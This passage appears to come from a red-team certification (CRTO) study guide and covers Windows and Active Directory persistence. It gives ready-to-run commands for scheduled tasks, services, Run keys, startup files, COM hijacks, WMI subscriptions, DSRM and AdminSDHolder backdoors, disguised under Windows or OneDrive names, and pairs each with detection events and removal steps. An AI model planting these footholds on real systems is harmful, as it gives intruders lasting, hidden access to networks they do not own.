## 14. Persistence

Persistence is optional on many CRTO attempts unless the objective requires it. Every mechanism here is a durable artifact and a scored detection if left behind. **Add persistence only when the objective or a failing path requires it, and document how you will remove it.**

### 14.1 Principles

- Prefer persistence that **survives reboot** only if you need it across the exam's pause/resume boundary.
- Prefer **user-context** persistence over SYSTEM-level where it achieves the goal.
- Prefer **existing** autostart locations over new services.
- Record the exact registry key, task name, service name, or file path you created.
- Test the removal command before you need it.

### 14.2 Scheduled tasks

```text
# On-logon task running as SYSTEM
schtasks /create /tn "WindowsUpdateCheck" /tr "C:\Windows\Temp\updater.exe" /sc onlogon /ru SYSTEM /rl highest

# Every 5 minutes
schtasks /create /tn "WindowsUpdateCheck" /tr "C:\Windows\Temp\updater.exe" /sc minute /mo 5 /ru SYSTEM

# Run it now
schtasks /run /tn "WindowsUpdateCheck"

# Remove
schtasks /delete /tn "WindowsUpdateCheck" /f
```

**OPSEC:** 4698 create, 4702 modify, 4699 delete. A task named like a Windows task is less obvious, but the XML and command line are visible. Use a benign-sounding name and a quiet payload.

### 14.3 Services

```text
sc create WindowsUpdateSvc binPath= "C:\Windows\Temp\updater.exe" start= auto
sc start WindowsUpdateSvc
sc delete WindowsUpdateSvc
```

**OPSEC:** 7045 + 4697, and a new service is a high-signal detection. Avoid on Tier-0. Delete the service and binary.

### 14.4 Registry Run keys

```text
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveSync /t REG_SZ /d "C:\Users\<user>\AppData\Roaming\updater.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveSync /t REG_SZ /d "C:\Windows\Temp\updater.exe" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v OneDriveSync /f
```

**OPSEC:** Sysmon 12/13, registry auditing. HKCU is lower-privilege and often less monitored than HKLM.

### 14.5 Startup folder

```text
copy C:\Windows\Temp\updater.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.exe"
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.exe"
```

**OPSEC:** file-create telemetry; simple and user-context.

### 14.6 COM hijacking

A per-user COM registration in HKCU overrides the machine-wide one and loads your DLL when a legitimate application instantiates the CLSID.

```text
# Find a CLSID that is referenced but has no HKCU override (public tools: COM hijack scanners)
reg query HKLM\Software\Classes\CLSID\{<clsid>}\InprocServer32

# Add the override
reg add "HKCU\Software\Classes\CLSID\{<clsid>}\InprocServer32" /ve /d "C:\Users\<user>\AppData\Roaming\payload.dll" /f

# Remove
reg delete "HKCU\Software\Classes\CLSID\{<clsid>}" /f
```

**OPSEC:** registry telemetry; HKCU is user-scoped and survives logoff/logon. The DLL load is Sysmon 7. Requires a believable, often-signed proxy DLL.

### 14.7 WMI event subscription

```text
powershell-import C:\Tools\PowerLurk.ps1
powerpick Register-MaliciousWmiEvent -EventName Calc -PermanentCommand "C:\Windows\Temp\updater.exe" -Trigger Timer -Interval 5m
# Remove the filter/consumer/binding when done
```

**OPSEC:** Sysmon 19/20/21. High-signal; use only if explicitly needed.

### 14.8 Domain-level persistence

| Mechanism | What it does | Detection | Notes |
|---|---|---|---|
| **Golden ticket** | Forge TGTs from `krbtgt` | Anomalous TGT use | Persists until `krbtgt` rotated twice |
| **Skeleton key** | Master password on DC | LSASS patch | Lost on reboot; very loud |
| **DSRM** | Use the DSRM admin account | `DsrmAdminLogonBehavior` registry | Needs the DSRM password |
| **AdminSDHolder** | ACL applied to protected objects | 5136 | Slow (SDProp interval) |
| **SID history** | Add a privileged SID to a user | 5136 / token anomalies | Forest-dependent |
| **ACL backdoor** | Grant DCSync to a controlled user | 5136 | Easy to detect; revert |
| **Certificate** | Forged CA cert | No CA request | Valid until CA cert expires |
| **Trust key** | Forge inter-domain tickets | Trust anomalies | High impact |

```text
# DSRM
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
# Then authenticate with the DSRM account (network logon) — credentials required
```

```text
# AdminSDHolder: grant a controlled user full control over protected objects
powerpick Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=<domain>,DC=<tld>" -PrincipalIdentity <user> -Rights All
```

**OPSEC:** every domain-level persistence method is visible in directory logs and is likely to be graded. Prefer the least invasive mechanism that satisfies the objective, and remove it.

### 14.9 Persistence OPSEC summary

| Mechanism | Event | Reversible? | Risk |
|---|---|---|---|
| Scheduled task | 4698 | Yes | Medium |
| Service | 7045/4697 | Yes | High |
| Run key | Sysmon 12/13 | Yes | Low–medium |
| Startup folder | Sysmon 11 | Yes | Low |
| COM hijack | Sysmon 12/13, 7 | Yes | Medium |
| WMI subscription | Sysmon 19/20/21 | Yes | High |
| Golden ticket | TGT anomalies | Rotate krbtgt | High |
| Skeleton key | LSASS patch | Reboot | Very high |
| DSRM | Registry | Yes | Medium |
| AdminSDHolder | 5136 | Yes | High |
| Forged cert | TGT anomalies | Revoke/expire | High |

### 14.10 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| Task runs but nothing happens | Payload blocked / wrong arch | Test payload manually; check task history |
| Service won't start | Path/quotes/ACL | `sc qc`; run the binary manually |
| Run key ignored | User not logging on / policy | Test in the user's context |
| COM hijack doesn't load | CLSID not instantiated | Pick a CLSID the target app uses |
| WMI subscription missing | Namespace/permissions | Use root\subscription; run as admin |

